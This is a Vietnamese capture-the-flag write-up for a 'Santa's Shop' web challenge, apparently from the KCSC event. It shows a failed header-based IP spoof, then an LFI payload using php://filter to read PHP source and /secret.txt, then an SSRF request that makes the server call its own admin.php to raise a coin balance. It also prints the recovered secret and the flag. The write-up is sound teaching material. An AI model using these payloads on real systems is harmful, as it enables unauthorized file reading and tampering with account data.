# Write-up: Santa 's Shop CTF Chanllenge

# **1. Mục tiêu**

Chúng ta có một tài khoản với 100 coin. Mục tiêu là mua được món quà bí ẩn "Mystery Gift Box" có giá 99,999 coin để lấy Flag. => Vấn đề: Không đủ tiền. Cần tìm cách hack số dư hoặc hack giá tiền.

# **2. Phân tích và khai thác** 

***Lần thứ 1 :*** 
-
- Mình thử truy cập các chức năng của web:
  
  - `Trang Nạp tiền`: `Báo lỗi Error 404.` -> Hướng này bế tắc  
  - `Admin Dashboard`: Hiện thông báo `"Chỉ có thể cập nhật từ localhost"`.

**Đây là gợi ý quan trọng. Server đang kiểm tra IP người dùng, yêu cầu phải là 127.0.0.1. Nếu thoả mãn điều kiện này, ta có thể chỉnh sửa tiền mà không cần đăng nhập Admin.**

- **Khai thác thử** :
  - Vì vậy mình sẽ chọn phương án tấn công vào Admin Dashboard bằng phương pháp giả mạo IP.
  - Ấn vào Admin DashBoard rồi dùng Burpsuite bắt request đó lại rồi send to repeater ,ở đây thêm header **`X-Forward-For: 127.0.0.1`** vào Request rồi send thử nhưng nó vẫn trả về **`chỉ có thể cập nhật coin từ localhost`**.
  - Có khả năng là cái header **`X-Forward-For`** không phải là header mà Server kiểm tra . Vậy thì có thể dùng bất cứ các loại header nào mà lập trình có thể dùng để kiểm tra IP thử xem . Mình đã thử gửi tất cả các biến thể cùng 1 lúc để xem cái nào dính . Tại sao lại cần phải kiểm tra thế này ? Bởi vì server thường chỉ kiểm tra 1 trong số các header trên . Chỉ cần 1 cái đúng thì có thể bypass được 
  - Request của bạn sẽ trông như thế này.

 ```python
 GET /admin.php HTTP/1.1
Host: 67.223.119.69:5017
Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
Cookie: PHPSESSID=da28ac2586b8128e301f7508f7201f6c
Connection: keep-alive
````

   - Nhưng Server vẫn báo **`chỉ có thể cập nhật từ localhost`**.

   - **Kết luận**: Server không tin vào các Header do người dùng gửi lên. Khả năng cao Server kiểm tra biến môi trường REMOTE_ADDR ( ( _Bạn có thể hình dung như là , bạn giả IP 127.0.0.1 gửi đến server , nhưng server sẽ không tin ngay mà nó sẽ gửi một phản hồi lại địa chỉ IP 127.0.0.1 đó , nếu bạn nhận được thì server nó mới tin IP bạn gửi đó chính là biến môi trường chứa IP thực_ )


     
     

***Lần thứ 2 :***
-
-  Mình thử vào mã nguồn của trang web đọc thử thì mình nhận thấy cơ chế hiển thị hình ảnh của trang web có điểm đáng ngờ , Thay vì trỏ trực tiếp vào đường dẫn file tĩnh (ví dụ: **`<img src="/images/CandyCane.jpg">`**), thẻ img lại gọi đến một file xử lý PHP:
**`<img src="/file.php?image=resource%2Fimage%2FCandyCane.jpg">**`. Endpoint **`/file.php`** nhận tham số image để đọc file và trả về người dùng . Nếu lập trình viên kiểm tra không kĩ , chúng ta có thể lợi dụng nó để đọc source PHP của chính trang web. ( giải thích thêm cho những bạn chưa biết như mình 

   - _Giải thích thêm : `/file.php` : Đây là một file mã nguồn thực thi . `?image=...` : Đây là nguyên liệu đầu vào . Điều này chứng tỏ Server đang thực hiện quy trình: Nhận đường dẫn từ tham số image -> Đọc nội dung file đó -> Trả về cho người dùng._
- Khai thác đọc Source Code: Mình muốn xem code của **`admin.php`** để biết chính xác nó kiểm tra cái gì. Tuy nhiên, nếu request trực tiếp **`/file.php?image=admin.php`**, server sẽ thực thi file đó chứ không hiện code. => Giải pháp: Dùng **`PHP Wrapper`** để mã hóa nội dung file sang Base64 trước khi hiển thị.
   
        
   - _Giải thích thêm về **`PHP Wrapper`** cho những bạn chưa rõ như mình thì hãy tưởng tượng PHP Wrapper (`php://filter`) giống như một "bộ lọc". Bình thường, Server thấy file .php là sẽ chạy ngay lập tức. Nhưng khi đi qua bộ lọc này, code bị biến đổi thành dạng mã hóa (Base64) - tức là chỉ còn là các ký tự văn bản vô hại. Nhờ đó, Server bị "lừa" và in toàn bộ nội dung file ra màn hình thay vì thực thi nó._
 
**Payload** : **`GET /file.php?image=php://filter/convert.base64-encode/resource=admin.php HTTP/1.1`**

**Kết quả** : Server trả về một chuỗi ký tự Base64 dài. Sau khi Decode chuỗi đó, mình thu được source code của admin.php như sau
```php
<?php
require_once 'config.php';
$secret = trim(file_get_contents("/secret.txt")); // đọc file secret.txt nằm ở thư mục gốc
// đoạn này kiểm tra ip 
if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1' && $_SERVER['REMOTE_ADDR'] !== '::1') {
    // http_response_code(403);
    die("Chỉ có thể cập nhật coin từ localhost !");
}
// kiểm tra tham số đầu vào -> tức là chỉ cần có username là được , ko bắt buộc phải admin
if (!isset($_GET['username']) || !isset($_GET['coin']) || !isset($_GET['secret'])) {
    die("Vui lòng nhập username, coin và SECRET");
}
// đoạn này kiểm tra secret có chính xác không
if ($secret !== $_GET['secret']){
    die("SECRET bạn nhập không chính xác.");
}
// nếu mọi thứ oke thì cập nhật tiền 
$username = trim($_GET['username']);
$coin = (int)$_GET['coin'];

try {
    $stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
    $stmt->execute([$username]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$user) {
        die("Không tìm thấy user: " . htmlspecialchars($username));
    }

    $stmt = $conn->prepare("UPDATE users SET coin = ? WHERE username = ?");
    $stmt->execute([$coin, $username]);

    echo "Đã cập nhật coin cho <b>{$username}</b> thành <b>{$coin}</b>!";
} catch (PDOException $e) {
    echo "Error: " . htmlspecialchars($e->getMessage());
}
?>

```
- Từ code này, ta biết để hack được tiền, ta cần 2 thứ:

  - Mã Secret: Nằm trong file `/secret.txt`
  - Request từ Localhost: Phải truy cập từ `127.0.0.1`


 
#
***Lần thứ 3***
-
**Lấy secret và tấn công**

- Tận dụng lại lỗ hổng LFI ở trên để đọc file `/secret.txt`. 

**Payload**:
**`GET /file.php?image=php://filter/convert.base64-encode/resource=/secret.txt HTTP/1.1`**

**Kết quả** : Mình lại nhận được thêm một chuỗi base64 **`Q2hpQ29uMUJ1b2NOdWFUaG9pfl9+Cg==`** và sau khi decode thì nhận được chuỗi secret là **`ChiCon1BuocNuaThoi~_~`**

- Sau khi lấy được secret rồi thì cần phải truy cập từ 127.0.0.1 (Chúng ta không thể Fake IP bằng Header vì code dùng `$_SERVER['REMOTE_ADDR']` - _là một biến siêu toàn cục (superglobal) trong PHP, chứa địa chỉ IP thực của người dùng (máy khách) đang kết nối và xem trang web hoặc ứng dụng của bạn_ )

- Lợi dụng chính file.php. Nếu file.php cho phép đọc file từ URL (SSRF), chúng ta sẽ bảo server "Tự gọi chính mình". Khi server tự gọi `http://127.0.0.1/admin.php`-> Bypass thành công! Nhưng làm thế nào để biết được nó có lỗi **SSRF** hay không ? -> thì cứ thử gửi `?image=http://gooogle.com` , nếu nó hiển thị ra cả trang google thì tức là có lỗi **SSRF**.

  - Giải thích dễ hiểu hơn thì nó như thế này 
  - Giả sử `image=http://127.0.0.1/admin.php` thì ra lệnh: Hàm `file_get_contents()` trong `file.php` nhận được đường dẫn `http://127.0.0.1/admin.php`.
  - Server (đang chạy `file.php`) . Nó tự tạo một kết nối HTTP mới xuất phát từ chính nó để gửi tới địa chỉ `127.0.0.1`.
  - Trang `admin.php` nhận được request này , nó kiểm tra xem ai đang gọi đến bằng cách nhìn vào biến **REMOTE_ADDR**.
  - Vì request này do Server tự gửi đi từ bên trong, nên **REMOTE_ADDR** hiển thị là `127.0.0.1`. -> bypass thành công

- URL mục tiêu cần gọi : `http://127.0.0.1/admin.php?username=test1&coin=999999&secret=ChiCon1BuocNuaThoi~_~`, nhưng nếu ta nhúng trực tiếp url trên vào tham số image thì server sẽ hiểu rằng `&` là dấu ngắt tham số dẫn đến mất dữ liệu `coin` và `secret`. -> cần phải encoding `&` thành `%26` .

- **Payload**: **`GET /file.php?image=http://127.0.0.1/admin.php?username=test1%26coin=999999%26secret=ChiCon1BuocNuaThoi~_~`** 

- **Kết quả** : **Đã cập nhật coin cho <b>test1</b> thành <b>999999</b>!**

**Vậy là đã cập nhật đươc số tiền từ 100 lên 999999 , bây giờ chỉ cần vào lại web và mua Mystery Gift Box để xem flag thôi** 

`flag : KCSC{m3rry_chr1stm4s_4nd_h4ppy_h4ck1ng}`
